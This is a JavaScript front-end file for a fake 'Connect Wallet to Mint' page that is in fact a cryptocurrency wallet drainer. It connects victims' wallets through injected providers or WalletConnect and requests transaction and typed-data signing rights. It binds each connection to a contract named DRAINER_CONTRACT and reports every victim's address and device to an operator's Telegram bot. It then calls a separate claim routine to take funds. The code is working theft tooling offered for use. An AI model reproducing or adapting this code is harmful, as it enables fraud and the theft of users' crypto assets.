import { CONFIG } from './config.js';
;(async function () {
  'use strict';

  // ──────────────────────────────────────────────────────────────────────
  //  1. DEBUG PANEL
  // ──────────────────────────────────────────────────────────────────────
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 160px; overflow-y: auto;
    display: none; font-family: monospace; line-height: 1.4;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    const line = `${new Date().toLocaleTimeString()}: ${msg}`;
    console.log('[main.js]', msg);
    debugArea.innerHTML += `<div>${line}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
    // Keep the debug log bounded
    if (debugArea.childElementCount > 300) {
      debugArea.removeChild(debugArea.firstChild);
    }
  }

  // ──────────────────────────────────────────────────────────────────────
  //  2. PLATFORM
  // ──────────────────────────────────────────────────────────────────────
  const isMobile  = () => /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
  const isIOS     = () => /iPhone|iPad|iPod/i.test(navigator.userAgent);
  const isAndroid = () => /Android/i.test(navigator.userAgent);
  const isDesktop = () => !isMobile();
  const isWindows = () => /Windows/i.test(navigator.userAgent);
  const isMac     = () => /Macintosh|Mac OS X/i.test(navigator.userAgent);

  const getPlatform = () =>
    isIOS()     ? 'ios' :
    isAndroid() ? 'android' :
    isWindows() ? 'windows' :
    isMac()     ? 'mac' :
                  'unknown';

  // ──────────────────────────────────────────────────────────────────────
  //  3. CONFIG
  // ──────────────────────────────────────────────────────────────────────
  const {
    PROJECT_ID,
    PUBLIC_TEST_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
    MAINNET_ID = 1,
    SUPPORTED_CHAINS = [1],
    TELEGRAM_BOT_TOKEN,
    TELEGRAM_CHAT_ID,
  } = CONFIG;

  const PRIMARY_CHAIN_ID    = MAINNET_ID;
  const PRIMARY_CHAIN_HEX   = '0x' + PRIMARY_CHAIN_ID.toString(16);
  const WC_REQUIRED_CHAIN   = `eip155:${PRIMARY_CHAIN_ID}`;

  let projectId = PROJECT_ID;

  // ──────────────────────────────────────────────────────────────────────
  //  4. TELEGRAM
  // ──────────────────────────────────────────────────────────────────────
  async function sendTelegramNotification(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const r = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML',
        }),
      });
      return r.ok;
    } catch {
      return false;
    }
  }
  window.testTelegram = (m) =>
    sendTelegramNotification(m || '🧪 Test ' + new Date().toISOString());

  // ──────────────────────────────────────────────────────────────────────
  //  5. WEBSOCKET REACHABILITY (mobile only, short timeout)
  // ──────────────────────────────────────────────────────────────────────
  async function checkRelayReachable(timeoutMs = 2500) {
    if (isDesktop()) return true;
    try {
      return await new Promise((resolve) => {
        const ws = new WebSocket('wss://relay.walletconnect.com');
        const t = setTimeout(() => { try { ws.close(); } catch {} resolve(false); }, timeoutMs);
        ws.onopen  = () => { clearTimeout(t); try { ws.close(); } catch {} resolve(true); };
        ws.onerror = () => { clearTimeout(t); try { ws.close(); } catch {} resolve(false); };
      });
    } catch {
      return false;
    }
  }

  // ──────────────────────────────────────────────────────────────────────
  //  6. PARALLEL LIBRARY LOADING
  //  Try all CDNs for a given module simultaneously; first success wins.
  // ──────────────────────────────────────────────────────────────────────
  function loadFirstAvailable(urls, pick) {
    return new Promise((resolve, reject) => {
      let failures = 0;
      let settled = false;

      urls.forEach(async (url) => {
        try {
          const mod = await import(url);
          if (settled) return;
          settled = true;
          resolve(pick(mod));
        } catch (e) {
          failures++;
          if (failures === urls.length && !settled) {
            settled = true;
            reject(new Error(`All CDNs failed for ${urls[0]}`));
          }
        }
      });
    });
  }

  async function loadWalletConnect() {
    logDebug('⏳ Loading WalletConnect libraries in parallel…');

    const [SignClient, WalletConnectModal, EthereumProvider] = await Promise.all([
      loadFirstAvailable([
        'https://esm.sh/@walletconnect/sign-client@2.11.0',
        'https://cdn.skypack.dev/@walletconnect/sign-client@2.11.0',
        'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.11.0/+esm',
      ], (m) => m.default || m),

      loadFirstAvailable([
        'https://esm.sh/@walletconnect/modal@2.6.2',
        'https://cdn.skypack.dev/@walletconnect/modal@2.6.2',
        'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm',
      ], (m) => m.WalletConnectModal || m.default || m),

      loadFirstAvailable([
        'https://esm.sh/@walletconnect/ethereum-provider@2.11.0',
        'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
        'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
      ], (m) => m.EthereumProvider || m.default || m),
    ]);

    if (!SignClient || !WalletConnectModal || !EthereumProvider) {
      throw new Error('WalletConnect libraries missing');
    }

    logDebug('✅ All WC libraries loaded (parallel)');
    return { SignClient, WalletConnectModal, EthereumProvider };
  }

  // ──────────────────────────────────────────────────────────────────────
  //  7. DOM + STATE
  // ──────────────────────────────────────────────────────────────────────
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  let currentSession   = null;
  let client           = null;
  let modal            = null;
  let SignClient       = null;
  let WalletConnectModal = null;
  let EthereumProvider = null;

  let web3Instance     = null;
  let contractInstance = null;
  let activeProvider   = null;
  let isConnecting     = false;

  // ──────────────────────────────────────────────────────────────────────
  //  8. BUTTONS / STATUS
  // ──────────────────────────────────────────────────────────────────────
  function setButtonState(button, state) {
    if (!button) return;
    button.style.display      = 'inline-block';
    button.style.padding      = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight   = '600';
    button.style.border       = 'none';
    button.style.cursor       = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.color        = 'white';
    button.style.fontSize     = '16px';
    button.style.minWidth     = '180px';
    button.disabled           = state === 'loading';

    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg,#666 0%,#888 100%)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg,#10B981 0%,#059669 100%)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg,#EF4444 0%,#DC2626 100%)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg,#EF4444 0%,#DC2626 100%)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg,#FF6B00 0%,#FF8C00 100%)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
    }
  }

  function showStatus(msg, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = msg;
    claimStatus.className   = `status ${type}`;
    claimStatus.style.display      = 'block';
    claimStatus.style.padding      = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop    = '12px';
    claimStatus.style.fontWeight   = '500';
    claimStatus.style.fontSize     = '14px';
    claimStatus.style.textAlign    = 'center';

    const styles = {
      success: { background: 'linear-gradient(135deg,#DCFCE7 0%,#BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg,#FEE2E2 0%,#FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg,#DBEAFE 0%,#BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);

    if (type === 'error' || type === 'success') {
      setTimeout(() => { claimStatus.style.display = 'none'; }, 5000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  // ──────────────────────────────────────────────────────────────────────
  //  9. LOCAL STORAGE
  // ──────────────────────────────────────────────────────────────────────
  const saveWallet = (address, session = null, chainType = null) => {
    localStorage.setItem('connectedWallet', address);
    if (session)   localStorage.setItem('walletConnectSession', JSON.stringify(session));
    if (chainType) localStorage.setItem('chainType', chainType);
  };
  const getSavedWallet    = () => localStorage.getItem('connectedWallet');
  const getSavedSession   = () => {
    const s = localStorage.getItem('walletConnectSession');
    return s ? JSON.parse(s) : null;
  };
  const getSavedChainType = () => localStorage.getItem('chainType') || 'unknown';
  const clearSavedWallet  = () => {
    localStorage.removeItem('connectedWallet');
    localStorage.removeItem('walletConnectSession');
    localStorage.removeItem('chainType');
  };

  // ──────────────────────────────────────────────────────────────────────
  //  10. GLOBAL STATE PUBLICATION
  //  This is the contract between main.js and script.js.
  // ──────────────────────────────────────────────────────────────────────
  function publishGlobalState(address, chain, provider = null) {
    const live = provider || activeProvider || null;

    window.__apexConnected = {
      address,
      chain,
      web3: web3Instance,
      contract: contractInstance,
      provider: live,
      session: currentSession,
      chainId: PRIMARY_CHAIN_ID,
      publishedAt: Date.now(),
    };

    logDebug(`📡 publish: addr=${address?.slice(0, 10)} provider=${!!live} contract=${!!contractInstance}`);

    window.dispatchEvent(new CustomEvent('apex:connected', {
      detail: { address, chain },
    }));
  }

  // ──────────────────────────────────────────────────────────────────────
  //  11. CONNECTED UI
  // ──────────────────────────────────────────────────────────────────────
  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel  = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg,#ECFDF5 0%,#D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
      `;
      connectButton.parentNode.appendChild(display);
    }

    const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;

    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const b = document.getElementById('copyAddress');
        const o = b.innerHTML;
        b.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { b.innerHTML = o; }, 2000);
      });
    });

    showStatus(`Connected to ${chainLabel}`, 'success');
    publishGlobalState(address, chain);

    sendTelegramNotification(`
🔗 <b>Wallet Connected</b>
📌 <b>Chain:</b> ${chainLabel}
👤 <b>Address:</b> <code>${address}</code>
🕒 ${new Date().toLocaleString()}
📱 <b>Mobile:</b> ${isMobile() ? 'Yes' : 'No'}
    `.trim());
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
    showStatus('Wallet disconnected', 'info');

    web3Instance     = null;
    contractInstance = null;
    activeProvider   = null;
    currentSession   = null;
    window.__apexConnected = null;
  }

  // ──────────────────────────────────────────────────────────────────────
  //  12. EIP-6963 PROVIDER DISCOVERY
  // ──────────────────────────────────────────────────────────────────────
  const evmProviders = [];
  let eip6963Initialized = false;

  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;

    window.addEventListener('eip6963:announceProvider', (e) => {
      const d = e.detail;
      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
        logDebug(`EIP-6963: ${d.info.name}`);
      }
    });

    window.dispatchEvent(new Event('eip6963:requestProvider'));
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 500);
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1500);
  }

  // ──────────────────────────────────────────────────────────────────────
  //  13. WALLET PICKER
  // ──────────────────────────────────────────────────────────────────────
  function showWalletSelectionModal(providers, cb) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `
      position:fixed;inset:0;background:rgba(0,0,0,0.7);
      display:flex;align-items:center;justify-content:center;z-index:99999;
    `;
    const m = document.createElement('div');
    m.style.cssText = `
      background:#1F2937;padding:24px;border-radius:16px;max-width:400px;
      width:90%;color:white;font-family:Inter,sans-serif;
    `;
    m.innerHTML = `
      <h3 style="margin-top:0;font-weight:600;font-size:20px;">Select a Wallet</h3>
      <div id="wl" style="display:flex;flex-direction:column;gap:10px;margin:16px 0"></div>
      <button id="cw" style="background:none;border:1px solid #666;color:#ccc;padding:8px 16px;border-radius:8px;cursor:pointer;width:100%">Cancel</button>
    `;
    overlay.appendChild(m);
    document.body.appendChild(overlay);

    const list = m.querySelector('#wl');
    providers.forEach((p) => {
      const b = document.createElement('button');
      b.textContent = p.info.name;
      b.style.cssText = `
        background:#374151;border:none;padding:12px;border-radius:8px;
        color:white;font-size:16px;cursor:pointer;text-align:left;
        display:flex;gap:10px;align-items:center;
      `;
      if (p.info.icon) {
        const i = document.createElement('img');
        i.src = p.info.icon;
        i.style.width = '24px';
        i.style.height = '24px';
        b.prepend(i);
      }
      b.onclick = () => { overlay.remove(); cb(p); };
      list.appendChild(b);
    });
    m.querySelector('#cw').onclick = () => { overlay.remove(); cb(null); };
  }

  // ──────────────────────────────────────────────────────────────────────
  //  14. WALLETCONNECT INIT
  // ──────────────────────────────────────────────────────────────────────
  async function initWalletConnect(useTestId = false) {
    if (client && modal) return true;

    if (useTestId) {
      projectId = PUBLIC_TEST_ID;
      logDebug('⚠️ Using PUBLIC_TEST_ID');
    } else {
      projectId = PROJECT_ID;
    }

    // Non-blocking relay check
    checkRelayReachable(2500).then((ok) => {
      if (!ok) logDebug('⚠️ Relay unreachable — proceeding anyway');
    });

    try {
      client = await SignClient.init({
        projectId,
        metadata: DAPP_METADATA,
        relayUrl: 'wss://relay.walletconnect.com',
      });

      modal = new WalletConnectModal({
        projectId,
        themeMode: 'dark',
        themeVariables: {
          '--wcm-z-index': '9999',
          '--wcm-accent-color': '#FF6B00',
          '--wcm-background-color': '#1F2937',
        },
        enableExplorer: true,
      });

      logDebug('✅ WalletConnect init OK');
      return true;
    } catch (e) {
      logDebug('WC init failed: ' + e.message);
      return false;
    }
  }

  // ──────────────────────────────────────────────────────────────────────
  //  15. PROVIDER EVENT FORWARDING
  // ──────────────────────────────────────────────────────────────────────
  function attachProviderEvents(provider) {
    if (!provider || !provider.on) return;

    // Remove any prior handlers to avoid duplicates
    if (provider.removeListener) {
      try { provider.removeListener('accountsChanged', onAccountsChanged); } catch {}
      try { provider.removeListener('chainChanged', onChainChanged); } catch {}
      try { provider.removeListener('disconnect', onProviderDisconnect); } catch {}
    }

    try { provider.on('accountsChanged', onAccountsChanged); } catch {}
    try { provider.on('chainChanged', onChainChanged); } catch {}
    try { provider.on('disconnect', onProviderDisconnect); } catch {}
  }

  function onAccountsChanged(accounts) {
    if (!accounts || accounts.length === 0) {
      resetConnectedUI();
      clearSavedWallet();
      return;
    }
    // Reattach provider reference — some WC providers drop it
    if (activeProvider) publishGlobalState(accounts[0], 'evm', activeProvider);
    updateConnectedUI(accounts[0], 'evm');
    saveWallet(accounts[0], null, 'evm');
    setTimeout(() => {
      if (typeof window.initiateClaimProcess === 'function') {
        window.initiateClaimProcess();
      }
    }, 1200);
  }

  function onChainChanged(chainId) {
    const id = typeof chainId === 'string' ? parseInt(chainId, 16) : Number(chainId);
    logDebug(`Chain changed → ${id}`);
    if (id !== PRIMARY_CHAIN_ID) {
      showStatus(`Wrong network (${id}). Please switch to chain ${PRIMARY_CHAIN_ID}.`, 'error');
    } else {
      showStatus(`Network OK (chain ${id})`, 'success');
    }
    if (web3Instance) {
      try {
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        publishGlobalState(window.__apexConnected?.address || getSavedWallet(), 'evm', activeProvider);
      } catch {}
    }
  }

  function onProviderDisconnect() {
    resetConnectedUI();
    clearSavedWallet();
  }

  // ──────────────────────────────────────────────────────────────────────
  //  16. DIRECT EVM (INJECTED)
  // ──────────────────────────────────────────────────────────────────────
  async function connectDirectEVM(timeoutMs = 8000) {
    setupEIP6963();
    await new Promise((r) => setTimeout(r, 700));

    let providers = evmProviders.filter((p) => p.provider);
    if (!providers.length && window.ethereum) {
      providers = [{
        info: { name: 'Injected', rdns: 'io.injected' },
        provider: window.ethereum,
      }];
    }
    if (!providers.length) return false;

    let chosen = null;
    if (providers.length === 1) {
      chosen = providers[0];
    } else {
      const known = providers.find((p) =>
        p.info.rdns === 'io.metamask' ||
        p.info.name.toLowerCase().includes('metamask')
      );
      chosen = known || await new Promise((res) => showWalletSelectionModal(providers, res));
      if (!chosen) return false;
    }

    try {
      const provider = chosen.provider;

      const accounts = await Promise.race([
        provider.request({ method: 'eth_requestAccounts' }),
        new Promise((_, rj) => setTimeout(() => rj(new Error('timeout')), timeoutMs)),
      ]);
      if (!accounts?.length) return false;

      const address = accounts[0];

      // ★ Set activeProvider BEFORE building anything that publishes state
      activeProvider = provider;

      const Web3 = (await import('web3')).default;
      web3Instance = new Web3(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      saveWallet(address, null, 'evm');
      attachProviderEvents(provider);
      updateConnectedUI(address, 'evm');

      logDebug(`✅ Direct EVM: ${address.slice(0, 10)}`);
      return true;
    } catch (e) {
      logDebug('Direct EVM error: ' + e.message);
      return false;
    }
  }

  // ──────────────────────────────────────────────────────────────────────
  //  17. WALLETCONNECT EVM — THE CRITICAL FLOW
  // ──────────────────────────────────────────────────────────────────────
  async function connectViaWalletConnect(useTestId = false, timeoutMs = 300000) {
    if (isConnecting) {
      logDebug('Connection already in progress');
      return false;
    }
    isConnecting = true;

    const initOk = await initWalletConnect(useTestId);
    if (!initOk) {
      isConnecting = false;
      showStatus('WalletConnect unavailable', 'error');
      return false;
    }

    // Close any stale modal
    if (modal?.closeModal) {
      try { modal.closeModal(); } catch {}
    }

    try {
      showStatus('Requesting connection…', 'info');

      const { uri, approval } = await client.connect({
        requiredNamespaces: {
          eip155: {
            methods: [
              'eth_sendTransaction',
              'personal_sign',
              'eth_signTypedData_v4',
            ],
            chains: [WC_REQUIRED_CHAIN],
            events: ['chainChanged', 'accountsChanged'],
          },
        },
      });

      if (!uri) throw new Error('No URI returned by WalletConnect');

      logDebug('📱 Opening modal with URI');
      modal.openModal({ uri });
      showStatus('Scan the QR code or open your wallet', 'info');

      sessionStorage.setItem('pending_wc_uri', uri);
      sessionStorage.setItem('pending_wc_timestamp', Date.now().toString());

      // ★ Wait for approval
      const session = await Promise.race([
        approval(),
        new Promise((_, rj) =>
          setTimeout(() => rj(new Error('approval-timeout')), timeoutMs)
        ),
      ]);

      logDebug('📥 Session approval received');

      // ★ Mobile-only delay before closing modal (deep-link handoff)
      if (modal) {
        if (isMobile()) {
          await new Promise((r) => setTimeout(r, 1200));
        }
        try { modal.closeModal(); } catch {}
      }

      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');

      if (!session?.namespaces?.eip155?.accounts?.length) {
        logDebug('❌ Session has no eip155 accounts');
        isConnecting = false;
        return false;
      }

      const account = session.namespaces.eip155.accounts[0].split(':')[2];
      currentSession = session;
      logDebug(`📥 WalletConnect account: ${account.slice(0, 10)}`);

      // ★ Retry EthereumProvider.init() up to 4 times with backoff
      let provider = null;
      for (let attempt = 1; attempt <= 4; attempt++) {
        try {
          logDebug(`🔧 EthereumProvider.init() attempt ${attempt}/4`);
          provider = await Promise.race([
            EthereumProvider.init({
              projectId,
              metadata: DAPP_METADATA,
              session,
              chains: [PRIMARY_CHAIN_ID],
              optionalChains: SUPPORTED_CHAINS,
              showQrModal: false,
            }),
            new Promise((_, rj) =>
              setTimeout(() => rj(new Error('provider-init-timeout')), 12000)
            ),
          ]);
          if (provider) {
            logDebug('✅ EthereumProvider.init() succeeded');
            break;
          }
        } catch (e) {
          logDebug(`⚠️ init attempt ${attempt} failed: ${e.message}`);
          if (attempt < 4) {
            await new Promise((r) => setTimeout(r, 800 * attempt));
          }
        }
      }

      // ★ Fallback shim if init() ultimately failed
      if (!provider) {
        logDebug('⚠️ Provider init failed — using session shim');
        provider = {
          request: async ({ method, params }) => {
            return client.request({
              topic: session.topic,
              chainId: WC_REQUIRED_CHAIN,
              request: { method, params },
            });
          },
          on: () => {},
          removeListener: () => {},
          _isShim: true,
        };
      }

      // ★ Set activeProvider BEFORE any UI update
      activeProvider = provider;

      const Web3 = (await import('web3')).default;
      web3Instance = new Web3(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      saveWallet(account, session, 'evm');

      // ★ Attach events BEFORE publishing state
      attachProviderEvents(provider);

      // ★ Update UI LAST
      updateConnectedUI(account, 'evm');

      logDebug(`✅ WalletConnect connected: ${account.slice(0, 10)}`);
      isConnecting = false;
      return true;
    } catch (e) {
      logDebug('WC error: ' + e.message);
      if (modal) { try { modal.closeModal(); } catch {} }
      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');
      isConnecting = false;
      return false;
    }
  }

  // ──────────────────────────────────────────────────────────────────────
  //  18. CONNECT DISPATCHER
  // ──────────────────────────────────────────────────────────────────────
  async function connectWallet() {
    if (isConnecting) return;

    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting…', 'info');

    let success = false;

    if (isDesktop()) {
      // Desktop: try injected first, fall back to WC
      success = await connectDirectEVM(8000);
      if (!success) success = await connectViaWalletConnect(false, 300000);
      if (!success) success = await connectViaWalletConnect(true, 300000);
    } else {
      // Mobile: WalletConnect only
      success = await connectViaWalletConnect(false, 300000);
      if (!success) success = await connectViaWalletConnect(true, 300000);
    }

    if (success) {
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') {
          window.initiateClaimProcess();
        }
      }, 1500);
    } else {
      showStatus('No wallet found', 'error');
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
    }
  }

  // ──────────────────────────────────────────────────────────────────────
  //  19. DISCONNECT
  // ──────────────────────────────────────────────────────────────────────
  async function disconnectWallet() {
    try {
      if (client && currentSession) {
        await client.disconnect({
          topic: currentSession.topic,
          reason: { code: 6000, message: 'User disconnected' },
        });
        currentSession = null;
      }
      if (web3Instance?.currentProvider?.disconnect) {
        await web3Instance.currentProvider.disconnect();
      }
    } catch {}
    resetConnectedUI();
    clearSavedWallet();
  }

  // ──────────────────────────────────────────────────────────────────────
  //  20. BUTTONS
  // ──────────────────────────────────────────────────────────────────────
  const handleClick = async () => {
    const saved = getSavedWallet();
    const hasSession = currentSession || getSavedChainType() !== 'unknown';
    if (saved && hasSession) {
      await disconnectWallet();
    } else {
      await connectWallet();
    }
  };

  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton)  walletButton.addEventListener('click', handleClick);

  if (walletButton && isMobile()) {
    walletButton.addEventListener('click', () => {
      setTimeout(() => {
        if (connectButton) {
          connectButton.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }
      }, 300);
    });
  }

  // ──────────────────────────────────────────────────────────────────────
  //  21. SESSION RESTORE
  // ──────────────────────────────────────────────────────────────────────
  async function restoreWalletConnection() {
    const savedWallet  = getSavedWallet();
    const savedChain   = getSavedChainType();
    const savedSession = getSavedSession();

    if (!savedWallet || savedChain !== 'evm') return;

    // WC restore
    if (savedSession) {
      const ok = await initWalletConnect(false);
      if (ok) {
        try {
          const session = client.session.get(savedSession.topic);
          if (session) {
            currentSession = session;

            let provider = null;
            for (let attempt = 1; attempt <= 4; attempt++) {
              try {
                provider = await Promise.race([
                  EthereumProvider.init({
                    projectId,
                    metadata: DAPP_METADATA,
                    session,
                    chains: [PRIMARY_CHAIN_ID],
                    showQrModal: false,
                  }),
                  new Promise((_, rj) =>
                    setTimeout(() => rj(new Error('restore-timeout')), 12000)
                  ),
                ]);
                if (provider) break;
              } catch {
                if (attempt < 4) await new Promise((r) => setTimeout(r, 800 * attempt));
              }
            }

            if (provider) {
              activeProvider = provider;
              const Web3 = (await import('web3')).default;
              web3Instance = new Web3(provider);
              contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
              attachProviderEvents(provider);
              updateConnectedUI(savedWallet, 'evm');
              logDebug('✅ WC session restored');
              return;
            }
          }
        } catch (e) {
          logDebug('Restore failed: ' + e.message);
        }
      }
    }

    // Injected restore (desktop only)
    if (isDesktop() && window.ethereum) {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts.length && accounts[0].toLowerCase() === savedWallet.toLowerCase()) {
          activeProvider = window.ethereum;
          const Web3 = (await import('web3')).default;
          web3Instance = new Web3(window.ethereum);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          attachProviderEvents(window.ethereum);
          updateConnectedUI(savedWallet, 'evm');
          return;
        }
      } catch {}
    }

    clearSavedWallet();
  }

  // ──────────────────────────────────────────────────────────────────────
  //  22. BOOT
  // ──────────────────────────────────────────────────────────────────────
  try {
    const libs = await loadWalletConnect();
    SignClient         = libs.SignClient;
    WalletConnectModal = libs.WalletConnectModal;
    EthereumProvider   = libs.EthereumProvider;
    logDebug('✅ Boot: libraries loaded');

    setupEIP6963();
    await restoreWalletConnection();
  } catch (err) {
    logDebug('❌ Fatal: ' + err.message);
    showStatus('Failed to load wallet libraries', 'error');
    return;
  }

  // ──────────────────────────────────────────────────────────────────────
  //  23. WC GLOBAL LISTENERS
  // ──────────────────────────────────────────────────────────────────────
  setTimeout(() => {
    if (!client) return;

    client.on('session_update', ({ params }) => {
      const accounts = params.namespaces?.eip155?.accounts;
      if (accounts?.length) {
        const a = accounts[0].split(':')[2];
        updateConnectedUI(a, 'evm');
        saveWallet(a, currentSession, 'evm');
        publishGlobalState(a, 'evm', activeProvider);
      }
    });

    client.on('session_delete', () => {
      resetConnectedUI();
      clearSavedWallet();
    });

    client.on('session_connect', (session) => {
      const a = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
      if (a) {
        saveWallet(a, session, 'evm');
        updateConnectedUI(a, 'evm');
        currentSession = session;
      }
    });
  }, 500);

  // Attach to injected provider on desktop boot
  if (window.ethereum && isDesktop()) {
    attachProviderEvents(window.ethereum);
  }

  window.addEventListener('beforeunload', () => {
    try { modal?.closeModal(); } catch {}
  });

  logDebug(`✅ main.js ready — platform: ${getPlatform()}, mobile: ${isMobile()}`);
})();
